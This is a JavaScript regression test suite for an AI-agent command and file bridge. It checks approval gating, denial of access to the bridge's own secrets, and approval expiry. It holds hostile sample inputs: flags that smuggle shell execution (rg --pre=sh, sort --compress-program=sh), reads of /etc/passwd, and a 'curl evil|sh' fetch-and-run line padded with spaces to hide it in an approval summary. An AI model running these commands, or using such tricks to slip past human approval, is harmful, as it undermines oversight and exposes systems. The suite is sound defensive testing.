// Round 5: regression suite for the three independent reviews.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { startServer } from '../../src/server.js';
import { KeyStore } from '../../src/lib/keystore.js';
import { BridgeClient } from '../client.mjs';

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'ab-rt5-'));
const ws = path.join(tmp, 'workspace');
fs.mkdirSync(ws, { recursive: true });
fs.writeFileSync(path.join(ws, 's.txt'), 'echo PWNED > ' + path.join(tmp, 'PWNED') + '\n');
fs.writeFileSync(path.join(ws, 'data.txt'), 'b\na\n');
fs.writeFileSync(path.join(ws, 'j.json'), '{"a":1}\n');
// config: expose tmp as an extra read root to test the install-dir deny
fs.writeFileSync(path.join(tmp, 'config.json'), JSON.stringify({ read_roots_extra: [tmp] }));

let inst = await startServer(tmp, { port: 0 });
const keystore = new KeyStore(path.join(tmp, 'secrets'));
let pass = 0, fail = 0;
const failures = [];
function check(name, cond, detail = '') {
  if (cond) { pass++; console.log(`  PASS  ${name}`); }
  else { fail++; failures.push(name); console.log(`  FAIL  ${name} ${detail}`); }
}
async function pairedClient(name, profile = 'developer') {
  const code = keystore.createPairingCode(profile);
  const c = new BridgeClient(`http://127.0.0.1:${inst.port}`);
  const r = await c.pair(code, name);
  if (r.status !== 200) throw new Error('pair failed');
  return c;
}
const isPending = (r) => r.rpc.result?.structuredContent?.status === 'pending_approval';

console.log('\n=== Round 5: F1 - flags are not free (the critical) ===');
{
  const c = await pairedClient('f1');
  for (const argv of [
    ['rg', '--pre=sh', 'x', 's.txt'],
    ['sort', '--compress-program=sh', 's.txt'],
    ['sort', '-o/tmp/x', 'data.txt'],
    ['sort', '--output=/tmp/x', 'data.txt'],
    ['grep', '--file=/etc/passwd', 'data.txt'],
    ['diff', '--to-file=/etc/passwd', 'data.txt'],
    ['rg', '--ignore-file=/etc/passwd', 'x', 'data.txt'],
    ['jq', '--rawfile', 'n', '/etc/passwd', 'j.json'],
    ['grep', '-f/etc/passwd', 'data.txt'],
    ['ls', '--bogus', '.'],
    ['cat', '-Z', 'data.txt'],
    ['head', '-n', '5', '/etc/passwd'],
    ['tail', '-n5', '/etc/passwd'],
    ['shasum', '-a', '256', '/etc/passwd'],
  ]) {
    const r = await c.call('process.run', { argv });
    check(`${JSON.stringify(argv)} needs approval`, isPending(r), JSON.stringify(r.rpc).slice(0, 120));
  }
  check('nothing executed', !fs.existsSync(path.join(tmp, 'PWNED')));
  // legit grammar uses still auto-run
  for (const argv of [
    ['ls', '-la', '.'], ['cat', 'data.txt'], ['cat', '-n', 'data.txt'],
    ['grep', '-i', 'A', 'data.txt'], ['head', '-n', '5', 'data.txt'], ['head', '-n5', 'data.txt'],
    ['sort', '-n', 'data.txt'], ['sort', '-u', 'data.txt'], ['wc', '-l', 'data.txt'],
    ['jq', '-r', '.a', 'j.json'], ['jq', '--raw-output', '.a', 'j.json'],
    ['shasum', '-a', '256', 'data.txt'], ['date', '+%Y'], ['echo', 'hello', 'world'],
    ['grep', '-m', '2', '-i', 'a', 'data.txt'], ['rg', '-i', 'a', 'data.txt'],
    ['diff', '-u', 'data.txt', 'data.txt'], ['uniq', 'data.txt'],
  ]) {
    const r = await c.call('process.run', { argv });
    check(`${JSON.stringify(argv)} auto-allowed`, !isPending(r) && !r.rpc.error, JSON.stringify(r.rpc).slice(0, 140));
  }
}

console.log('\n=== Round 5: F3/fs#1 - bridge state is never agent-visible ===');
{
  const c = await pairedClient('f3', 'readonly');
  for (const p of [
    path.join(tmp, 'secrets', 'audit.key'),
    path.join(tmp, 'secrets', 'agents.json'),
    path.join(tmp, 'approvals', 'approvals.json'),
    path.join(tmp, 'logs', 'audit.jsonl'),
    path.join(tmp, 'config.json'),
    path.join(tmp, 'versions'),
    path.join(tmp, 'trash'),
    tmp, // install dir root
  ]) {
    const r = await c.call('fs.read', { path: p });
    const r2 = await c.call('fs.list', { path: p });
    const denied = !!r.rpc.error && !!r2.rpc.error;
    check(`${p.replace(tmp, 'INSTALL')} denied (even with parent as read root)`, denied, JSON.stringify(r.rpc).slice(0, 100));
  }
  const okR = await c.call('fs.read', { path: 'data.txt' });
  check('workspace read still works', okR.rpc.result?.structuredContent?.content === 'b\na\n');
  const okX = await c.call('fs.read', { path: path.join(tmp, 'config.json') });
  check('install-dir config denied but sibling files visible? config denied', !!okX.rpc.error);
}

console.log('\n=== Round 5: F4/fs#3 - cross-agent poll does not burn ===');
{
  const { Approvals } = await import('../../src/lib/approvals.js');
  const ap = new Approvals(path.join(tmp, 'approvals'));
  const a = await pairedClient('agent-a');
  const b = await pairedClient('agent-b');
  const d = await a.call('fs.delete', { path: 'data.txt' });
  const apid = d.rpc.result.structuredContent.approval_id;
  ap.decide(apid, 'approve');
  const steal = await b.call('approval.status', { approval_id: apid });
  check('other agent gets forbidden', steal.rpc.result.structuredContent.status === 'forbidden');
  const mine = await a.call('approval.status', { approval_id: apid });
  check('owner still executes afterwards', mine.rpc.result.structuredContent.status === 'executed', JSON.stringify(mine.rpc.result).slice(0, 150));
  check('trash manifest recorded', fs.readFileSync(path.join(tmp, 'trash', 'manifest.jsonl'), 'utf8').includes('data.txt'));
}

console.log('\n=== Round 5: F5 - approved approvals survive new creates ===');
{
  const { Approvals } = await import('../../src/lib/approvals.js');
  const ap = new Approvals(path.join(tmp, 'approvals'));
  const c = await pairedClient('agent-c');
  fs.writeFileSync(path.join(ws, 'f5.txt'), 'x');
  const d = await c.call('fs.delete', { path: 'f5.txt' });
  const apid = d.rpc.result.structuredContent.approval_id;
  ap.decide(apid, 'approve');
  // a second agent creates more approvals before the first is polled
  const c2 = await pairedClient('agent-c2');
  fs.writeFileSync(path.join(ws, 'f5b.txt'), 'x');
  await c2.call('fs.delete', { path: 'f5b.txt' });
  const st = await c.call('approval.status', { approval_id: apid });
  check('approved approval survives later creates', st.rpc.result.structuredContent.status === 'executed', JSON.stringify(st.rpc.result).slice(0, 120));
}

console.log('\n=== Round 5: F6 - approvals go stale after approval ===');
{
  const { Approvals } = await import('../../src/lib/approvals.js');
  const ap = new Approvals(path.join(tmp, 'approvals'));
  const c = await pairedClient('agent-d');
  fs.writeFileSync(path.join(ws, 'f6.txt'), 'x');
  const d = await c.call('fs.delete', { path: 'f6.txt' });
  const apid = d.rpc.result.structuredContent.approval_id;
  ap.decide(apid, 'approve');
  // age the decision by 11 minutes
  ap._withLock(() => {
    const list = ap._read();
    const rec = list.find(x => x.id === apid);
    rec.decided_at = new Date(Date.now() - 11 * 60 * 1000).toISOString();
    ap._write(list);
  });
  const st = await c.call('approval.status', { approval_id: apid });
  check('stale approval -> expired, not executed', st.rpc.result.structuredContent.status === 'expired');
  check('file not deleted', fs.existsSync(path.join(ws, 'f6.txt')));
}

console.log('\n=== Round 5: fs hardening ===');
{
  const c = await pairedClient('agent-e');
  // strict base64
  const b64 = await c.call('fs.write', { path: 'x.txt', content_base64: '!!!!aGk' });
  check('lenient base64 rejected', !!b64.rpc.error);
  // empty file ok
  const empty = await c.call('fs.write', { path: 'empty.txt', content_base64: '' });
  check('empty file write works', !empty.rpc.error && fs.existsSync(path.join(ws, 'empty.txt')));
  // lexical symlink write refused
  fs.writeFileSync(path.join(ws, 'ln-target.txt'), 'orig');
  fs.symlinkSync(path.join(ws, 'ln-target.txt'), path.join(ws, 'ln.txt'));
  const lw = await c.call('fs.write', { path: 'ln.txt', content_base64: Buffer.from('evil').toString('base64') });
  check('write through in-workspace symlink refused', !!lw.rpc.error && fs.readFileSync(path.join(ws, 'ln-target.txt'), 'utf8') === 'orig');
  // hardlink refused
  fs.linkSync(path.join(ws, 'ln-target.txt'), path.join(ws, 'hard.txt'));
  const hw = await c.call('fs.write', { path: 'hard.txt', content_base64: Buffer.from('evil').toString('base64') });
  check('write to hardlinked file refused', !!hw.rpc.error);
  // delete directory refused
  fs.mkdirSync(path.join(ws, 'adir'));
  const dd = await c.call('fs.delete', { path: 'adir' });
  check('directory delete refused at plan', !!dd.rpc.error);
  const dw = await c.call('fs.delete', { path: '.' });
  check('workspace-root delete refused', !!dw.rpc.error);
  // versioning survives fast overwrites
  await c.call('fs.write', { path: 'v.txt', content_base64: Buffer.from('1').toString('base64') });
  await c.call('fs.write', { path: 'v.txt', content_base64: Buffer.from('2').toString('base64') });
  await c.call('fs.write', { path: 'v.txt', content_base64: Buffer.from('3').toString('base64') });
  const vdir = fs.readdirSync(path.join(tmp, 'versions'));
  const vcount = vdir.length ? fs.readdirSync(path.join(tmp, 'versions', vdir[0])).length : 0;
  check('two versions kept after three writes', vcount === 2, 'count=' + vcount);
}

console.log('\n=== Round 5: F2 - approval summary fidelity ===');
{
  const { Approvals } = await import('../../src/lib/approvals.js');
  const ap = new Approvals(path.join(tmp, 'approvals'));
  const longCmd = 'ls ' + ' '.repeat(600) + '; curl evil|sh';
  const c = await pairedClient('agent-f');
  // shell disabled, so plan fails; test the store directly
  const rec = ap.create({ kind: 'shell', agentId: c.agentId, summary: 'shell: ' + longCmd, payload: { command: longCmd } });
  const stored = ap._read().find(x => x.id === rec.id);
  check('full summary stored (no 500-char truncation)', stored.summary.includes('curl evil|sh'), 'len=' + stored.summary.length);
}

console.log(`\nROUND 5 RESULT: ${pass} repelled, ${fail} succeeded`);
if (failures.length) { console.log('SUCCESSFUL ATTACKS:'); failures.forEach(f => console.log('  - ' + f)); process.exit(1); }
await new Promise(r => inst.server.close(r));
process.exit(0);
